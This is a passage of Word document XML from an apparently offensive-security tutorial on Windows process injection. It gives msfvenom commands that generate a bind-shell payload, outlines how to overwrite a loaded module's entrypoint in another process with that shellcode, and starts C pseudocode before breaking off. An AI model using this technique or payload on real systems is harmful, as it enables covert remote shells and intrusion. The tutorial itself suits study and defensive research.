      <w:r w:rsidR="00A62160" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. We will stick with a simple example, which just opens a network socket and attaches a shell to it. So, boot up your nearest Kali instance and run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD533A2" w14:textId="77777777" w:rsidR="00A62160" w:rsidRPr="001E7AD6" w:rsidRDefault="00A62160" w:rsidP="00A62160">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Msfvenom –p windows/x64/shell_bind_tcp &gt; shellcode.raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2A727F" w14:textId="7E103A6F" w:rsidR="00A62160" w:rsidRPr="001E7AD6" w:rsidRDefault="00A62160" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The output is a file containing only raw instructions. </w:t>
      </w:r>
      <w:r w:rsidR="00914C21" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>If we drop it into IDA Pro, we can see that the code contains</w:t>
      </w:r>
      <w:r w:rsidR="00AD331D" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> inline </w:t>
      </w:r>
      <w:r w:rsidR="00914C21" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>string literals. Here, the shellcode is using the value “ws2_32”, moving it into the r14 register:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CA4BCD" w14:textId="77777777" w:rsidR="00AD331D" w:rsidRPr="001E7AD6" w:rsidRDefault="00AD331D" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30771ECC" w14:textId="77777777" w:rsidR="00914C21" w:rsidRPr="001E7AD6" w:rsidRDefault="001519D4" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="5843F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hellcode-mov-literal" style="width:7in;height:15pt;mso-width-percent:0;mso-height-percent:0;mso-width-percent:0;mso-height-percent:0">
            <v:imagedata r:id="rId8" o:title="shellcode-mov-literal"/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAD742E" w14:textId="77777777" w:rsidR="00AD331D" w:rsidRPr="001E7AD6" w:rsidRDefault="00AD331D" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="733AF921" w14:textId="77777777" w:rsidR="002A3C28" w:rsidRPr="001E7AD6" w:rsidRDefault="00914C21" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The value is shown in reverse, since it is being treated as a little-endian integer and not a string. The hex string in blue indicates the bytes that the instruction represents – 49 BE corresponds to moving a 64-bit immediate value into r14. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E53579" w14:textId="144FE9F0" w:rsidR="00914C21" w:rsidRPr="001E7AD6" w:rsidRDefault="00914C21" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>“Immediate”, in this sense, denotes that the value to load directly follows the opcode itself, and it isn’t located in main memory – so it’s n</w:t>
      </w:r>
      <w:r w:rsidR="00AD331D" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>either</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the stack</w:t>
      </w:r>
      <w:r w:rsidR="002A3C28" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nor the heap. You can verify this by checking the remaining opcode bytes – they correspond to “ws2_32\0\0”. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48415A18" w14:textId="77777777" w:rsidR="00914C21" w:rsidRPr="001E7AD6" w:rsidRDefault="00914C21" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This may seem like a strange way of referencing a string – usually, the string would be in the heap, for example – but remember, our shellcode has no knowledge of the memory layout of the system it runs on. It has no idea where the heap is located in memory, and so cannot safely reference it. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2A1D38" w14:textId="58CE4D30" w:rsidR="00914C21" w:rsidRPr="001E7AD6" w:rsidRDefault="00914C21" w:rsidP="00914C21">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3217"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Since the shellcode possesses this ability, all we need to do in order to run it is to copy the shellcode itself into an executable region and start it. There is no requirement to set up a heap, </w:t>
      </w:r>
      <w:r w:rsidR="00F5436A" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">or configure any other things which the OS might </w:t>
      </w:r>
      <w:r w:rsidR="002A3C28" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">otherwise </w:t>
      </w:r>
      <w:r w:rsidR="00F5436A" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>provide to an executable, such as command</w:t>
      </w:r>
      <w:r w:rsidR="00AD331D" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F5436A" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>line arguments, environment values, or an initial window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AFA04D" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Implementation  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA54ADD" w14:textId="7D7422B2" w:rsidR="00F5436A" w:rsidRPr="001E7AD6" w:rsidRDefault="00403FE6" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00F5436A" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>o recap, our injection tool must perform the following steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E38012F" w14:textId="77777777" w:rsidR="00403FE6" w:rsidRPr="004B4AA4" w:rsidRDefault="00403FE6" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C35F687" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="004B4AA4" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Open a handle to a legitimate, already-running target process on the system </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3F49D2" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="004B4AA4" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Get the target process to load a legitimate target module </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFFE0A4" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="004B4AA4" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Copy the shellcode we got from msfvenon over the legitimate target module’s code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7659EE3C" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="004B4AA4" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Start a new thread to execute our shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73155AE5" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="154D0100" w14:textId="0254FB64" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="00403FE6" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>We can use existing techniques t</w:t>
      </w:r>
      <w:r w:rsidR="00F5436A" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">o compel the module load. </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">In this case, we’ll </w:t>
      </w:r>
      <w:r w:rsidR="00F5436A" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>use the time-honoured technique of calling CreateRemoteThread with a start address of LoadLibraryW. Note that this requires seDebugPrivilege, which is a potential detection spot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462C0F94" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="007309B0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Before we know where to copy our shellcode, we parse the PE header of the target module. This will tell us the module’s entrypoint, which is usually the first thing in the module – allowing us to occupy maximum space.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA49B13" w14:textId="64A17483" w:rsidR="00161CBC" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="00F5436A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">With that, we can simply WriteProcessMemory with our shellcode. Note that msfvenom has the ability to output a C-formatted array containing shellcode, which reduces the amount of code we need to write. Specify “-f c” – </w:t>
      </w:r>
      <w:r w:rsidR="00403FE6" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>in other words</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, C format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7078E23B" w14:textId="20FFB2FD" w:rsidR="00161CBC" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="00161CBC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Msfvenom –p windows/x64/shell_bind_tcp –f c &gt; shellcode.h</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E31B8D" w14:textId="0C824EE2" w:rsidR="00485D1E" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="001E7AD6">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Full code is available in the related Git repo as “inject_simple”. Pseudocode follows</w:t>
      </w:r>
      <w:r w:rsidR="00967BDA" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to show the general flow</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A4BFE0" w14:textId="77777777" w:rsidR="00F5436A" w:rsidRPr="001E7AD6" w:rsidRDefault="00F5436A" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7861AB12" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>#include</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"../injectionUtils/public.h"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55ECC24E" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76E71269" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// The shellcode generated by msfvenom, in a char array named ‘buf’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BA2B73" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>#include</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"shellcode.h"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1621A46F" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23ADFF02" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> wmain(</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TCHAR</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> *</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651CAA8B" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C786E4" w14:textId="77777777" w:rsidR="003555DB" w:rsidRPr="001E7AD6" w:rsidRDefault="003555DB" w:rsidP="003555DB">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>// Get the target PID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8E9DFC" w14:textId="77777777" w:rsidR="00E20B02" w:rsidRPr="001E7AD6" w:rsidRDefault="00E20B02" w:rsidP="00E20B02">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
